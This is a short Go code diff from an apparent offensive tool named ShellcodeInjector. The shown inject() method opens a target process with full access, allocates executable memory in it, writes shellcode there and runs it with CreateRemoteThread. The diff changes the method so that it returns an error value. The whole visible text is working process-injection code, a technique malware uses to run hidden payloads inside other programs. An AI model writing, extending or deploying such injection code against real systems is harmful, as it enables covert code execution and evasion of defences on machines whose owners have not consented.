@@ -14,7 +14,7 @@ type ShellcodeInjector struct {
 
 const processEntrySize = 568
 
-func (si ShellcodeInjector) inject() {
+func (si ShellcodeInjector) inject() error {
     MEM_COMMIT := uintptr(0x1000)
     PAGE_EXECUTE_READWRITE := uintptr(0x40)
     PROCESS_ALL_ACCESS := uintptr(0x1F0FFF)
@@ -28,9 +28,11 @@ func (si ShellcodeInjector) inject() {
     closehandle := kernel32.MustFindProc("CloseHandle")
     
     // inject & execute shellcode in target process' space
-    processHandle, _, _ := openproc.Call(PROCESS_ALL_ACCESS, 0, uintptr(si.pid))
+    processHandle, _, msg := openproc.Call(PROCESS_ALL_ACCESS, 0, uintptr(si.pid))
     remote_buf, _, _ := vallocex.Call(processHandle, 0, uintptr(len(si.shellcode)), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
     writeprocmem.Call(processHandle, remote_buf, uintptr(unsafe.Pointer(&si.shellcode[0])), uintptr(len(si.shellcode)), 0)
     createremthread.Call(processHandle, 0, 0, remote_buf, 0, 0, 0)
     closehandle.Call(processHandle)
+
+    return msg
 }
